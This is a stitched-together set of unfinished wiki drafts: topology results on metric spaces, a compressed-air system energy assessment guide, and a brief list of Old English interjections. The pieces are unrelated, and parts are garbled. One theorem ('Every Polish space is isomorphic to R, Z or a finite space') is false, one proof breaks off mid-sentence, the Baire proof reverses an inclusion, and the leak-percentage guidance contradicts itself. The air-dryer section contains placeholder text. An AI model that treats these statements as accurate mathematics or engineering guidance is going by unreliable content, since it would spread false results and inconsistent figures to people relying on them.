      <text xml:space="preserve">'''2 Lemma'''
*''(i) &lt;math&gt;\operatorname{dist}(\cdot, E) = \operatorname{dist}(\cdot, \overline{E})&lt;/math&gt;.''
*''(ii) &lt;math&gt;\operatorname{dist}(\cdot, E)&lt;/math&gt; is a 1-Lipschitz continuous.''
Proof:
Suppose a sequence &lt;math&gt;y_n \in E&lt;/math&gt; converges to &lt;math&gt;y \in \overline{E}&lt;/math&gt;. Since &lt;math&gt;\operatorname{dist}(x, E) \le \operatorname{dist}(x, y_n)&lt;/math&gt;,
we have:
:&lt;math&gt;\operatorname{dist}(x, E) \le \operatorname{dist}(x, y)&lt;/math&gt;.
Taking inf over &lt;math&gt;y&lt;/math&gt; gives (i). For the second, since &lt;math&gt;\operatorname{dist}(x, E) \le \operatorname{dist}(x, y) + \operatorname{dist}(y, z)&lt;/math&gt;, taking inf over z,
:&lt;math&gt;\operatorname{dist}(x, E) \le \operatorname{dist}(x, y) + \operatorname{dist}(y, E)&lt;/math&gt;.
By symmetry in the formula, we obtain (ii).&lt;math&gt;\square&lt;/math&gt;

'''2 Theorem''' ''A metric space is completely regular Hausdorff.''&lt;br /&gt;
Proof: Let &lt;math&gt;x \ne y&lt;/math&gt;, and &lt;math&gt;r = d(x, y)&lt;/math&gt;. It follows that &lt;math&gt;B(x, r/2)&lt;/math&gt; and &lt;math&gt;B(y, r/2)&lt;/math&gt; are disjoint to each others. In fact, if they intersect at, say, &lt;math&gt;z&lt;/math&gt;, then
:&lt;math&gt;r = d(x, y) \le d(x, z) + d(z, y) &lt; r / 2 + r / 2 = r&lt;/math&gt;,
which is absurd. Finally, a metric space is completely regular because &lt;math&gt;\operatorname{dist}&lt;/math&gt;, which is continuous by the above lemma, separates a closed set and a point.&lt;math&gt;\square&lt;/math&gt;

'''2 Theorem''' ''Let &lt;math&gt;f:X \to Y&lt;/math&gt; be a function. Suppose &lt;math&gt;X&lt;/math&gt; is metric. Then &lt;math&gt;f&lt;/math&gt; is continuous if and only if &lt;math&gt;x_n \to x&lt;/math&gt; implies &lt;math&gt;f(x_n) \to f(x)&lt;/math&gt;.''&lt;br /&gt;
Proof: Both the statements are equivalent to:
:&lt;math&gt;f(\overline{E}) \subset \overline{f(E)}&lt;/math&gt;
for every subset &lt;math&gt;E \subset X&lt;/math&gt;.
&lt;math&gt;\square&lt;/math&gt;

'''2 Corollary''' ''&lt;math&gt;f&lt;/math&gt; is continuous if and only if &lt;math&gt;f&lt;/math&gt; is continuous on every compact subset of &lt;math&gt;X&lt;/math&gt;. (Recall that in Chapter 1 we proved the same result for locally compact spaces.)''&lt;br /&gt;
Proof: (&lt;math&gt;\Rightarrow&lt;/math&gt;) is obvious. For (&lt;math&gt;\Leftarrow&lt;/math&gt;), suppose &lt;math&gt;x_n \to x&lt;/math&gt;. Let &lt;math&gt;K = \{ x, x_1, x_2, ... \}&lt;/math&gt;. Then &lt;math&gt;K&lt;/math&gt; is compact; in fact, if &lt;math&gt;U_j&lt;/math&gt; is an open cover of &lt;math&gt;K&lt;/math&gt;, then &lt;math&gt;x \in U_N&lt;/math&gt; for some &lt;math&gt;N&lt;/math&gt; and, by convergence, &lt;math&gt;U_N&lt;/math&gt; contains all but finitely many terms of the sequence &lt;math&gt;x_n&lt;/math&gt;. Now, since &lt;math&gt;f&lt;/math&gt; is continuous on &lt;math&gt;K&lt;/math&gt;, &lt;math&gt;f(x_n) \to f(x)&lt;/math&gt;. &lt;math&gt;\square&lt;/math&gt;

'''2 Theorem''' ''Let &lt;math&gt;K&lt;/math&gt; be a metric space. Then the following are equivalent:''
* ''(i) &lt;math&gt;K&lt;/math&gt; is compact.''
* ''(ii) Every sequence of &lt;math&gt;K&lt;/math&gt; admits a convergent subsequence.'' (i.e., &lt;math&gt;K&lt;/math&gt; is sequentially compact)
* ''(iii) &lt;math&gt;K&lt;/math&gt; is complete and totally bounded.''
Proof: To show (i) &lt;math&gt;\Rightarrow&lt;/math&gt; (ii), suppose (ii) is invalid. That is to say, there exists a sequence &lt;math&gt;x_n \in K&lt;/math&gt; with no convergent subsequence. For each &lt;math&gt;n&lt;/math&gt;, we can then find &lt;math&gt;\delta_n &gt; 0&lt;/math&gt; such that &lt;math&gt;B(x_n, \delta_n)&lt;/math&gt; contains only &lt;math&gt;x_n&lt;/math&gt; and no other point in the sequence. Since the sequence &lt;math&gt;x_n&lt;/math&gt; consists of isolated points, it is closed, and thus it is a compact subset whose open cover doesn't admit a finite subcover, falsifying (i). (ii) &lt;math&gt;\Rightarrow&lt;/math&gt; (iii). By (ii), every Cauchy sequence contains a convergent subsequence, and so, the sequence itself converges. &lt;math&gt;K&lt;/math&gt; is thus complete. To show the totally boundedness, suppose &lt;math&gt;K&lt;/math&gt; is not totally bounded. We can then find a sequence consisting of isolated points, which obviously doesn't have a convergent subsequence and so contradicts (ii). We conclude (ii) &lt;math&gt;\Rightarrow&lt;/math&gt; (iii). For (iii) &lt;math&gt;\Rightarrow&lt;/math&gt; (i), since &lt;math&gt;K&lt;/math&gt; is complete, it suffices to show that every ultrafilter is Cauchy, but this is immediate from the definitions of the totally boundedness and a Cauchy filter. &lt;math&gt;\square&lt;/math&gt;

'''2 Corollary''' ''Every compact metric space &lt;math&gt;K&lt;/math&gt; is separable.''&lt;br /&gt;
Proof:
Since &lt;math&gt;K&lt;/math&gt; is totally bounded, for each &lt;math&gt;n &gt; 0&lt;/math&gt;, there is a finite subset &lt;math&gt;F_n \subset K&lt;/math&gt; such that
:&lt;math&gt;K = \bigcup_{x \in F_n} B(x, n^{-1})&lt;/math&gt;
Let &lt;math&gt;E&lt;/math&gt; be the union of &lt;math&gt;F_n&lt;/math&gt; over all &lt;math&gt;n&lt;/math&gt;. Evidently, &lt;math&gt;E&lt;/math&gt; is dense. &lt;math&gt;\square&lt;/math&gt;

'''2 Theorem''' ''Let &lt;math&gt;f_k \in C(X)&lt;/math&gt; be a sequence. Then &lt;math&gt;f_k&lt;/math&gt; converges pointwise if and only if &lt;math&gt;f_k(x_k) \to f(x)&lt;/math&gt; for any sequence &lt;math&gt;x_k \to x&lt;/math&gt;.&lt;br /&gt;
Proof:
(&lt;math&gt;\Rightarrow&lt;/math&gt;) Let &lt;math&gt;K&lt;/math&gt; be a compact set containing &lt;math&gt;x_k&lt;/math&gt;. Then

'''2 Theorem (Baire)''' ''Let &lt;math&gt;X&lt;/math&gt; be a complete metric space. If &lt;math&gt;X = \bigcup_n E_n&lt;/math&gt;, then some &lt;math&gt;E_n&lt;/math&gt; contains an interior point.'' &lt;br /&gt;
Proof:
Let &lt;math&gt;V_n&lt;/math&gt; be the interior of the closure of &lt;math&gt;E_n&lt;/math&gt;. Then &lt;math&gt;V_n&lt;/math&gt; is dense by hypothesis. The theorem is then equivalent to say that the intersection of &lt;math&gt;V_n&lt;/math&gt; over all &lt;math&gt;n&lt;/math&gt; is dense. To prove that, let &lt;math&gt;W \subset X&lt;/math&gt; be an open subset. By denseness, there is &lt;math&gt;x_1&lt;/math&gt; and &lt;math&gt;r_1 &gt; 0&lt;/math&gt; such that:
:&lt;math&gt;\overline{B}(x_1, r_1) \subset W \cap V_1&lt;/math&gt;.
By iteration, we can find &lt;math&gt;x_n&lt;/math&gt; and &lt;math&gt;r_n &gt; 0&lt;/math&gt; such that:
:&lt;math&gt;\overline{B}(x_n, r_n) \subset B(x_{n-1}, r_{n-1}) \cap V_n&lt;/math&gt; as well as &lt;math&gt;r_n &lt; n^{-1}&lt;/math&gt;
Since &lt;math&gt;x_n \in B(x_m, r_m)&lt;/math&gt; when &lt;math&gt;n &gt; m&lt;/math&gt;, we have that &lt;math&gt;x_n&lt;/math&gt; is Cauchy, and &lt;math&gt;x_n&lt;/math&gt; converges to some limit &lt;math&gt;x&lt;/math&gt;. For any &lt;math&gt;n&lt;/math&gt;, by closedness,
:&lt;math&gt;x \in \overline{B}(x_{n-1}, r_{n-1}) \subset B(x_n, r_n)&lt;/math&gt;.
Hence, &lt;math&gt;x \in W&lt;/math&gt; and &lt;math&gt;x \in V_n&lt;/math&gt; for all &lt;math&gt;n&lt;/math&gt;. &lt;math&gt;\square&lt;/math&gt;

'''2 Theorem (Banach fixed point theorem)''' ''Let &lt;math&gt;X&lt;/math&gt; be a complete metric space, and let &lt;math&gt;f:X \to X&lt;/math&gt; be a function. If there is a constant &lt;math&gt;0 &lt; c &lt; 1&lt;/math&gt; such that:
:&lt;math&gt;d(f(x), f(y)) \le c d(x, y)&lt;/math&gt; for all &lt;math&gt;x, y \in X&lt;/math&gt;
then &lt;math&gt;f&lt;/math&gt; admits a unique fixed point; i.e., &lt;math&gt;f(x) = x&lt;/math&gt; for some &lt;math&gt;x&lt;/math&gt;. Moreover, &lt;math&gt;\lim_{n \to \infty} f^n(y) = f(x)&lt;/math&gt; for every &lt;math&gt;y \in X&lt;/math&gt;.&lt;br /&gt;
Proof: See [[w:Banach fixed point theorem]]

Define &lt;math&gt;\operatorname{dist}(x, E) = \inf \{ d(x, y) | y \in E \}&lt;/math&gt; for a nonempty subset &lt;math&gt;E \subset X&lt;/math&gt;.

A topological space homeomorphic to a separable complete metric space is called a ''Polish space''.

'''2 Theorem''' ''Let &lt;math&gt;X&lt;/math&gt; be a topological space. Then &lt;math&gt;X&lt;/math&gt; is Polish if and only if it is homeomorphic to a &lt;math&gt;G_\delta&lt;/math&gt; subset of the Hilbert cube.

'''2 Theorem''' ''Every Polish space is isomorphic to one of (i) R, (ii) Z or (iii) a finite space.''

Let &lt;math&gt;\mathcal{C}_c(X) = \Gamma_c (X, \mathcal{C})&lt;/math&gt;, and &lt;math&gt;\mathcal{C}_0(X)&lt;/math&gt; be the space of all &lt;math&gt;f \in \mathcal{C}(X)&lt;/math&gt; such that &lt;math&gt;\{ x \in X | f(x) \ge c \}&lt;/math&gt; is compact. Clearly, &lt;math&gt;\mathcal{C}_c(X) \subset \mathcal{C}_0(X)&lt;/math&gt;. When &lt;math&gt;X&lt;/math&gt; is an open subset of &lt;math&gt;\mathbf{R}^n&lt;/math&gt;, &lt;math&gt;\mathcal{C}(X)&lt;/math&gt; consists of those &lt;math&gt;f&lt;/math&gt; such that &lt;math&gt;\lim_{|x| \to \infty} f(x) = 0&lt;/math&gt;.

'''2 Theorem''' ''Let ''X'' be a locally compact space. Then &lt;math&gt;\mathcal{C}_c(X)&lt;/math&gt; is dense in &lt;math&gt;\mathcal{C}_0(X)&lt;/math&gt;.''&lt;br /&gt;
Proof: Let &lt;math&gt;f \in \mathcal{C}_0(X)&lt;/math&gt;, and &lt;math&gt;K_n = \{ x \in X | f(x) \ge n^{-1} \}&lt;/math&gt;. Using Lemma 2.something, choose &lt;math&gt;\psi_n \in \mathcal{C}_c(X)&lt;/math&gt; such that &lt;math&gt;\psi_n = 1&lt;/math&gt; on &lt;math&gt;K_n&lt;/math&gt;. Then &lt;math&gt;\psi_n f \to f&lt;/math&gt;. &lt;math&gt;\square&lt;/math&gt;

      <text xml:space="preserve">==Collecting Data==
This step of an assessment is performed at the plant. After familiarizing yourself with the equipment and terms involved with compressed air systems, examine plant equipment and identify the type of compressed air system. Data can then be collected for each specific piece of equipment. This section includes data collection tools and methods for gathering standard system data.

'''&lt;u&gt;Data Collection Tools&lt;u&gt;'''
* '''Digital Multimeter:''' (DMM: Power used by an electric motor can be directly measured or calculated from voltage and amperage. Use a DMM to measure the voltage at the motor starter or control panel. Measure line-to-line or line-to-ground voltages depending on probe placement. Use caution and understand important safety precautions when measuring high voltage.

* '''Clamp-on Ammeter:''' Amperage is needed to calculate power. A clamp-on ammeter senses line current by measuring the current induced in the ammeter by the magnetic field produced by the current. Use the clamp-on ammeter to measure the current in all three phases for power calculations. It is important measure amperage at as many operating conditions as possible to allow accurate modeling of equipment operation.

* '''Power Analyzer:''' A power analyzer measures and stores power use over time. A 3 phase-power analyzer, for example, has three clamp-on ammeters, three voltage probes, a neutral probe, and a ground probe. Connecting these to the motor leads allows the power analyzer to measure all line-to-line voltages, line-to-ground voltages, all line currents, phase shifts, and to calculate power. Read the instructions carefully to connect leads correctly for the type of power system (delta) or (wye).

* '''Pressure Gauge:''' Many are compressors include a pressure gauge on the control panel. For compressors that do not have a gauge use a pressure gauge that fits in to quick disconnect fittings to measure system pressure at several places.

* '''Capacity Gauge:''' Many compressors include a capacity gauge that displays the airflow, usually in acfm, that is being delivered. Record the acfm at as many operating loads as possible to accurately model the operation of the compressor. The gauge may be a vacuum gauge that measures air density at a throttled inlet, or be connected to an airflow meter.

* '''Stopwatch:''' Useful to measure on/off &amp; load-unload cycles for use factor calculation.

* '''Rag:''' Useful to wipe off dirty nameplates.

* '''Flashlight:''' Compressors are often located in dark catacombs of the plants. Their location makes reading gauges and nameplates difficult.

* '''Tape Measure:''' For pipe, receiver, or duct dimensions.

      <text xml:space="preserve">==Analysis Tools &amp; Methods==
This section of the assessment guide presents analysis tools and methods that will be used later in the recommendation section. The recommendation section outlines data required, procedures, and ideas needed to analyze energy use in compressed air systems. Refer to equation in this chapter when directed by the recommendation section.

''&lt;u&gt;Standard Analysis Methods&lt;u&gt;'''

'''Calculate Existing Energy Use Profile'''
Before analyzing potential recommendations you must be able to calculate compressor energy use under different operating conditions and control strategies. 

'''Data Required'''
* All Standard Air Compressor Data
''' Tools Required'''
* Air Compressor Data Worksheets
* Measured Operating Conditions worksheets
* Air Compressor Savings Worksheets

The Measured Operating Conditions and the Air Compressor Savings Worksheets, found in the Data Collection Tools section, provide a convenient way to record data required to calculate energy use. Calculating energy use requires an understanding of the relationship between power and airflow for difference control strategies. These relationships are outlined in the Technology Primer section as well as the Appendix.
Use this section as a guide to using these relationships to calculate air compressor energy use.
Enter measured data into the Measured Operating Conditions Worksheet. The subsequent calculation procedure depends on whether you entered airflow (%C) or power (kW). examples of how to calculate energy use are provided for each case. apply this method to each operating condition you have identified. 

'''Calculating Existing Energy Use(using measured power(kW)):'''
Data Entry, Enter annual hours and power into the Existing Conditions table of the Air Compressor Savings Worksheet. Divide the compressor power of the selected operating condition by the power at full load. Calculated energy use by mulitplying power by annual hours of operation for each operating condition. Calculate Percent Power from Power:

&lt;u&gt;1. Percent Power = Operating Point Power / Full Load Power&lt;u&gt;

&lt;u&gt;2. Calculate Energy from Operating Point Power&lt;u&gt;
Energy = Power x Annual Operating Hours

'''Energy Calculations (using measured power (kW)):'''

&lt;u&gt;3. Calculate Airflow&lt;u&gt;
The relationship between airflow and power depends on control strategy. Conversion formulas for typical controls follow

      <text xml:space="preserve">==Recommendations==
This section contains methods for estimating savings from efficiency improvements. Overview this section at the plant to determine which recommendation are feasible and what data is required to accurately calculate savings.

==Recommendation #1 - Reduce Air Leaks==
'''Summary:''' Reduce the amount of compressed air lost to leaks.

'''When to Apply:''' 
Generally, reducing leaks to the following percentages of plant loads is possible:
* 30% high power, dirty environments, ex. Sawmills
* 20% medium power environments, ex. Plastic manufactoring
* 10% light power, clean environments, ex. Electronics
If leak load is smaller than this the action will be more difficult to justify economically. On air compressors that only operate part time, the payback periods are longer.

'''Key Engineering Concepts:'''
* Reducing airflow saves some energy.
* Turning off a compressor provides more significant savings.
* Avoiding the purchase of a new compressor saves both capital and energy expenses.
* Although it is not direct, compressor energy use is related to the amount of air compressed.

'''Preparation:'''
* Data Required
  - All Standard Air Compressor Data, including leak load. (See Section 3.)
* Tools Required
  - DMM or Ammeter or Power Analyzer
  - Air Compressor Data Worksheets
  - Measured Operating Conditions worksheets
  - Air Compressor Savings Worksheets

==Analysis Process:==
'''&lt;u&gt;1. Enter Existing Operating Conditions on Worksheets.&lt;u&gt;'''

See Section 5. Analysis Tools &amp; Methods

'''&lt;u&gt;2. Calculate Peak Plant Load.&lt;u&gt;'''

The peak plant load is the peak production airflow minus air leaks.
* Plant Load = Peak Production Load - Leak Load

'''&lt;u&gt;3. Calculate Existing Leak Load as a percentage of the Peak Plant Load.&lt;u&gt;'''

The Leak Load Percentage relates the air lost to leaks to air used by the plant.
* Leak Load % = Leak Load / Plant Load

'''&lt;u&gt;4. Enter Proposed Leak Percentage&lt;u&gt;'''

A typical proposed leak load is 30% of plant load for a relatively leaky system, 2% is fairly average, and 10% is a tight, clean system. if the current leak load is at or below 30% of plant load, this recommendation is not likely to offer significant savings.
Calculate Proposed Leak Load:
* Proposed Leak Load = Plant Load x Proposed Leak Load Percentage

'''&lt;u&gt;5. Calculate Proposed Airflows for each operating load.&lt;u&gt;'''

* Proposed Airflow = Existing Airflow - Existing Leak Load %C + Proposed Leak Load %C

'''&lt;u&gt;6. Calculate Proposed energy use for each operating condition&lt;u&gt;'''

Calculate proposed energy use using proposed airflows. Also, see Section 5. Analysis Tools &amp; Methods.

'''&lt;u&gt;7. Complete the Air Compressor Savings Worksheets for reduced air leaks.&lt;u&gt;'''

'''&lt;u&gt;8. Estimate implementation cost and determine payback&lt;u&gt;'''

Leaks typically arise faulty fittings, lines, valves, and hoses. These leaks are generally easy to repair, with little or no material cost. If pneumatic rams or cylinders are leaking, they will have to be rebuilt or replaced. Rebuild kits and labor may cost severally hundred dollars, depending on the size and location of the leak. Typically repairing leaks has a payback of less than one year.

==Recommendation #2 - Use Unload Controls==
'''Summary:''' Use low-unload or load-unload controls with a modulating compressor to increase the part load efficiency.

'''When to Apply:''' Modulating compressor have poor part load efficiencies. Any time a modulating compressor operates at a part load there may be an opportunity for savings with unloading controls. This recommendation applies best to modulating compressors operating at part load for a significant percentage of time. Sometimes the unloading controls are already present, but are not being used.

'''Key Engineering Concepts:'''
* Inlet and discharge pressure are reduced when a compressor unloads. Lower pressure result in lower power requirements, generally in the range of 20% of full load power when discharge pressure is reduced to atmospheric pressure.
* Unload controls allow an air compressor to unload when airflow drops or system pressure increases to a predetermined set point. 
* Successful implementation may require adding receiver capacity. The air system must also allow pressure variations up to 10 psi typically.

'''Preparation:'''
* Data Required:
  - All Standard Air Compressor Data. (See Section 3)
  - Proposed Unload Point and existing Unloaded Operation Conditions.

==Analysis Process:==
'''&lt;u&gt;1. Calculate Air Compressor Energy Use for Existing Operating Conditions.&lt;u&gt;'''

(See Section 5)

'''&lt;u&gt;2. Determine a Proposed Unload Point.&lt;u&gt;'''

Choosing an unload control strategy will determine the unloading point. Load-unload controls dictate a 100% Capacity Unload Point, while Low-Unload controls will have an unload point that is adjustable or set by the compressor manufacturer. The compressor manufacturer will quote both an Unloaded Power and a range for the Unload point. Use this information from the manufacturer or dealer to choose a proposed unload point and calculate proposed power for all operating conditions of interest.

'''&lt;u&gt;3. Calculate Proposed Power.&lt;u&gt;'''

Airflow will not change for any loads when adding unload controls. Calculate power for typical plant operating points using the appropriate formula.
* If airflow &lt; Unload Point (%C&lt;%CUL):
* Power = (Unload Point %P - Unloaded %P) x Load %C + No Load %P
If airflow is above the Unload Point, calculate power with the appropriate formula for the appropriate type of modulating controls. Refer to Section 5. Analysis Tools &amp; Methods.

'''&lt;u&gt;4. Calculate Energy Use for Proposed Operating Conditions.&lt;u&gt;'''

See Section 5. Analysis Tools &amp; Methods.

'''&lt;u&gt;5. Determine energy savings.&lt;u&gt;'''

Use differences in proposed and existing Operating Conditions to calculate energy and dollar savings.

'''&lt;u&gt;6. Estimate implementation cost and determine payback.&lt;u&gt;'''

Costs for implementing this recommendation can include unloading controls, additional receiver capacity, and labor.

Prices for unloading controls vary from compressor to compressor. contact the manufacturer for their prices. Estimate $1,500 to retrofit, $700 option for a new compressor. 

Unload controls perform better if the system has adequate receiver capacity. The receiver must be large enough to allow the air compressor to stay unloaded for at least 2 minutes per cycle. To size system storage, a rule of thumb estimate is one gallon of storage for each CFM of peak airflow. Estimate $4/gallon of received capacity installed.

Alternately, you can get vendor quotes for receivers and estimate labor time and cost to install receivers. Many plants have maintenance crews that could install additional receivers. Generally, labor costs for outside contractors run $50 to $60 an hour with the installation requiring from 5 to 10 hours.

==Recommendation #3 - Reduce System Pressure ==
'''Summary:''' Power is required to compress air atmospheric pressure to system pressure. A lower system pressure will require less power per CFM. Set compressors to the lowest possible pressure required by plant equipment, plus line losses between the air compressors and equipment.

'''When to Apply:''' This recommendation applies when system pressure is significantly greater than required by end-uses. There may be pressure-regulators on some equipment to limit pressure. If the pressure drop across regulators is significant, reduce system pressure. This may required segregating end uses by pressure requirements.

'''Key Engineering Concepts:'''
* Compressor power decreases approximately 1/2% for each psi reduction in discharge pressure.
* With reduced system pressure, air lost to regulated air uses is reduced by approximately 3/4% per psi.
* The minimum pressure for oil separators is typically 80 psi but it varies from compressor to compressor.

'''Preparation:'''
* Data Required
  - All Standard Air Compressor Data. (See Section 3.)
  - System Operating Pressure
  - Minimum required pressure
* Tools required
  - DMM
  - Air Compressor data sheets

==Analysis process:==
'''&lt;u&gt;1. Calculate Air Compressor Power for Existing Operating Conditions&lt;u&gt;'''

See Section 5. Analysis Tools &amp; Methods.

'''&lt;u&gt;2. Determine Proposed Full Load Power with reduced pressure.&lt;u&gt;'''

Full load motor power decreases by reducing pressure differential across the compressor.
* Full Load Power = Existing Full Load Power x ((ln(proposed pressure/atmospheric pressure))/(ln(existing pressure/atmospheric pressure)))

'''&lt;u&gt;3. Calculate Reduction in Airflow&lt;u&gt;'''

By reducing system there will be less airflow to most loads, including leaks.
* Proposed Airflow = Existing Airflow x (Proposed Pressure + Atm. Pressure)/(Existing Pressure + Atm. Pressure)

'''&lt;u&gt;4. Calculate Air Compressor Energy Use for Proposed Operating Conditions&lt;u&gt;'''

See Section 5. Analysis Tools &amp; Methods.

'''&lt;u&gt;5. Determine Energy Savings&lt;u&gt;'''

Use differences in proposed and existing Operating Conditions to calculate energy and dollar savings.

'''&lt;u&gt;6. Estimate implementation cost and determine payback&lt;u&gt;'''

Implementation for this recommendation is often negligible, as the only requirement is to adjust the pressure of the compressor. However, if excessive system losses require high pressure then the implementation cost will include correcting this situation.

==Recommendation #4 - Replace Air Dryer==
'''Summary:'''Industrial processes require varying amounts and dryness of dried air. Several ypes of air dryers exist that dry air to varying dew points using different methods.

'''When to Apply:''' Dry air only to a minimum dew point required for plant operations. When the volume of air being dried or dryness is beyond what is required, there is an opportunity for savings.

'''Key Engineering Concepts:'''
Atmospheric air contains water vapor. When compressed air cools, this vapor condenses and causes problems with corrosion and air uses that are sensitive to water. Drying air is an energy intensive process.

?????????

*Data Required
  - All Standard Air Compressor Data. 
  - Type of air dryer
  - Air Dryer Energy Use
  - The Required dew point for plant air
* Tools Required 
  - DMM
  - Air Compressor data sheets

==Analysis Process==
'''&lt;u&gt;1. Estimate Existing air dryer operating costs.&lt;u&gt;'''

Air dryers are expensive to operate and maintain. Costs arise from a number of sources. Calculate the cost of each of the following:

&lt;u&gt;Direct Energy Requirements (DER)&lt;u&gt;
Refrigerated dryers use energy to cool the compressed air. Heated desiccant dryers use energy to heat the compressed air used to purge the desiccant beds. Calculate refrigeration and heating energy by measuring and recording volts and amps or power being used by the dryers.

&lt;u&gt;Pressure Drop(PD)&lt;u&gt;
Air Dryers introduce a pressure drop to the air system that costs an extra 1/2% power from the comrpessor for each psi of pressure drop. Refrigerated air dryers will induce a pressure drop of about 5 psi. Desiccant air dryers cause a negligible pressure drop. Membrane air dryers will have a pressure drop of about (I am still looking for this). If gauges are available, compare pressures before and after the air dryer to determine pressure drop.

&lt;u&gt;Air to Regenerate Desiccant Tanks (PA)&lt;u&gt;
Desiccant air dryers use dry air to regenerate the desiccant beds. Heated dryers heat the compressed air before passing it through the beds, while others pass unheated dry air through the beds. The added energy required to heat the air is more than offset by the amount of compressed air saved. The cost of compressed air used to regenerate desiccant beds can be calculated by estimating the airflow (acfm) required to regenerate, and referring to Section 5. Analysis Tools &amp; Methods.

Purge frequency can be controlled by two means: capacity control (constant time interval); or moisture control.

Capacity control diverts a portion of the dried compressed airflow through the desiccant beds, usually for a fixed time interval. Then, the regenerated desiccant bed is switched on line while the other bed is regenerated.

The moisture (humidity) sensor initiates regeneration when a set level of moisture is reached in the desiccant bed, and can also terminate regeneration when the bed is dry. This type is generally more efficient as only the amount of dry air required is used. Estimate the regeneration airflow by observing the time that the desiccant beds are being regenerated and from manufacturer's specifications.

&lt;u&gt;Replacing Desiccants and Filters (CP)&lt;u&gt;
Desiccant dryers require periodic replacement of desiccant material. Depending on the quantity and frequency of replacement this cost can be substantial. Plant personnel might have records of how often the desiccant is replaced.

&lt;u&gt;Maintenance Requirements (MR)&lt;u&gt;
Membrane type dryers claim to be virtually maintenance free. Refrigerated and desiccant dryers all have parts that can wear and will need maintenance. The plant personnel should be able to estimate maintenance requirements.

The total cost of drying air is the sum of the following costs:
* Direct Energy
* Pressure Drop
* Regeneration Air
* Consumable Parts
* Maintenance

'''&lt;u&gt;2. Determine appropriate Dew Point.&lt;u&gt;'''

In mild climates it is not often enough where airlines are exposed to outdoor temperatures to require dew points below about 35 degrees to 50 degrees F. However, some locations and applications do require dryer air. Ask Plant personnel about how dry the air needs to be. If they are drying the air much below 35 degrees F confirm that they really require air that dry. if there are only one or two pieces of equipment that require extremely dry air consider isolating those air uses.

'''&lt;u&gt;3. Choose appropriate air dryer.&lt;u&gt;'''

Use catalogs and distributors to select an appropriate air dryer. Estimate the operating costs for that dryer. Estimate the energy required by a new dryer from manufacturer's  specifications. Available types of air dryers vary in cost and ability to dry air. Following is a brief guide to the operating costs and capabilities of various air drying methods.

Refrigerated Air Dryers are usually the best option for plants without extreme drying requirements. Refrigerated dryers are effective for drying air down to 35 degrees - 50 degrees F.

Desiccant Air Dryers are required for dew points below 35 degrees F. The most efficient desiccant air dryers include capacity controlled regeneration and a system to heat the dry air before regeneration.

Membrane Air Dryers are capable of reaching similar dew point to refrigerated dryers however they cause a larger pressure drop through the membrane.

'''&lt;u&gt;4. Determine energy savings.&lt;u&gt;'''

Calculate differences in proposed and existing Operating Conditions to determine energy and dollar savings.

'''&lt;u&gt;5. Estimate implementation cost and determine payback.&lt;u&gt;'''

Implementation cost includes the air dryer and installation. Rough installed costs/ 1000 SCFM are:
* Refrigerated air dryer - $10,000
* Heated Regenerative air dryers - $25,000
* Heater-less Regenerative air dryer -= $12,500

==Recommendation #5 - Isolated Air Uses==
'''Summary:'''Often plants have one large air compressor providing air to all applications. Isolating high pressure, high hour or particularly low moisture requirements form the main air system can save energy.

'''When to Apply:''' When one appplication dictates the pressure, drying requirement, and/or the operating hours for the compressed air system while all of the other uses could be met with lower pressure air, fewer operating hours, or less energy intensive air drying processing.

'''Key Engineering Concepts:'''
Power and energy are proportional to the pressure difference. Stringent drying requirements are expensive to maintain.

'''Preparation:'''
* Data Required
  - All Standard Air Compressor Data. (See Section 3)
  - Required Airflow, Pressure and Operating Hours of processes that can be isolated.
* Tools Required
  - DMM
  - Air Compressor data sheets

==Analysis Process==
'''&lt;u&gt;1. Identify Processes that may be isolated from the main plant air system&lt;u&gt;'''
Any time there is a plant process that requires higher pressure air, dryer air, or more operating hours than the rest of the plant there is an opportunity to isolate that process.
Examples are:

  - Fire Suppression Systems
    -In dry fire suppression systems large plant air compressors are often employed to keep the pipes charged with compressed air. This requires that the compressors be left on all the time although fire systems generally require no airflow. During non-production periods the air compressors may only be supplying leaks. By isolating fire systems the large plant air compressor can be turned off during down time, while a small air compressor can maintain fire system pressure.

  - Paint Booths
    -Painting applications generally require low pressures. If this pressure is significantly lower than that required for the rest of the plant, consider isolating the paint booth. use one air compressor to fulfill the low-pressure requirements of the paint booth and another to fulfill the higher pressure demands of the rest of the plant is often a good idea.

  - Dry air
    -Some material handling systems or painting applications require dryer air than the rest of the plant. Isolating these uses and only stringently dry the air that requires it.

Calculate the energy savings for the air system.

Savings result from reducing pressure, switching to less expensive air-drying, and reducing run time. If reducing pressures, refer to the Reduce Pressure recommendation guide. Id changing air-drying requirements, refer to Replace air dryer recommendation guide. If reducing run time, use the calculations below.

&lt;U&gt;Calculate Energy Savings from Reducing Run Time&lt;u&gt;
  - Energy Savings = Operating Power x Saved Hours
  - ES = D x SH

'''&lt;u&gt;3. Estimate the required airflow, pressure and operating hours of the isolated process.&lt;u&gt;'''

'''&lt;u&gt;4. Size an appropriate new compressor to meet the isolated loads.&lt;u&gt;'''
Air compressor manufacturers publish specifications in both ACFM and pressure. To size a compressor, select one that meets the isolated load pressure and airflow requirements, or refer the requirements to a manufacturer or vendor. to be conservative in your savings estimates assume the compressor will operate at rated power, even thought this will not always be the case. If the compressor is to be used to pressure in a fixed volume of pipes. With small or no leaks in the pipes, the compressor will used little or no energy. If the compressor is to be used to run a paint booth you will need to find out pressure and airflow requirements. Use this information to estimate compressor energy use.

&lt;u&gt; Calculate Energy Use for a new compressor&lt;u&gt;
  - Energy Usage = Rated Power x Operating hours x Use Factor x Load Factor
  - E = P x OH x UF x LF

'''&lt;u&gt;5. Determine energy savings&lt;u&gt;'''
Calculate differences in proposed and existing Operating Conditions to determine energy and dollar savings.

'''&lt;u&gt;6. Estimate implementation cost and determine payback.&lt;u&gt;'''
The implementation cost includes purchase and installation of a new air compressor. Obtain these costs from a compressor manufacturer or dealer.

      <text xml:space="preserve">{{Old English}}
'''Interjections''' are words used to express an emotion. The most common Old English interjections were:

* Ēa - oh
* Ēalā - lo, oh (also said when seeing someone - like an acknowledgement)
* Hwæt - what!
* Lā （frequently used in combination with other words or interjections - see &quot;ēalā&quot; above) - lo
* Wā - woe!, misery!
* Wel, wel - well, well

Oh particular interest is the interjection &quot;lā&quot;, which could be used in the middle of a sentence to emphasize almost anything being said, including statements, questions, requests, and commands. For example:
*Cum lā! - Come on!
*Ġief mē þā bōc lā - Please give me the book
*Saga lā þætte þū þenċest - Do say what you're thinking
*Hwæt lā is þæt? - Whatever is that?
*He is lā wel grēat - He is indeed tall

